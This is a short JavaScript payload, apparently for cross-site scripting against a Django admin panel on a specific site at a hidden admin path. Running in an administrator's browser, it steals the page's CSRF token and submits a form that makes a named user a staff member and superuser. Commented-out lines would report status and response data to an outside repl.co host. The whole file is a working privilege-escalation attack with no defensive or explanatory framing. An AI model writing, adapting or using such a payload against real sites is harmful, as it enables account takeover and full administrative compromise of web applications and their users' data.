redirected = false;
(async () => {
  res = await fetch(
    "https://gyane.xyz/gyane_private_admin_no_body_should_know_it_changed/auth/user/"
  );
  // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
  //   method: "POST",
  //   body: { res: res.status },
  //   headers: {
  //     "Content-Type": "application/json",
  //   },
  // });
  redirected = res.redirected;
  if (!redirected && res.status != 403) {
    formData = new FormData();
    formData.append(
      "csrfmiddlewaretoken",
      document.getElementsByName("csrfmiddlewaretoken")[0].value
    );
    formData.append("username", "joonshakya");
    formData.append("first_name", "Joon");
    formData.append("last_name", "Shakya");
    formData.append("email", "joonshakya07@gmail.com");
    formData.append("is_active", "on");
    formData.append("is_staff", "on");
    formData.append("is_superuser", "on");
    formData.append("last_login_0", "2022-01-22");
    formData.append("last_login_1", "11:01:32");
    formData.append("date_joined_0", "2022-01-20");
    formData.append("date_joined_1", "14:39:02");
    formData.append("initial-date_joined_0", "2022-01-20");
    formData.append("initial-date_joined_1", "14:39:02");
    formData.append("_save", "Save");
    res3 = await fetch(
      "https://gyane.xyz/gyane_private_admin_no_body_should_know_it_changed/auth/user/20/change/",
      { method: "POST", body: formData }
    );
    // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
    //   method: "POST",
    //   body: { done: "Done" },
    //   headers: {
    //     "Content-Type": "application/json",
    //   },
    // });
    if (res3.ok) {
      data3 = await res3.text();
      // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
      //   method: "POST",
      //   body: JSON.stringify({ data3 }),
      //   headers: {
      //     "Content-Type": "application/json",
      //   },
      // });
    } else {
      // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
      //   method: "POST",
      //   body: JSON.stringify({ error: res3.status }),
      //   headers: {
      //     "Content-Type": "application/json",
      //   },
      // });
    }
  }
})();
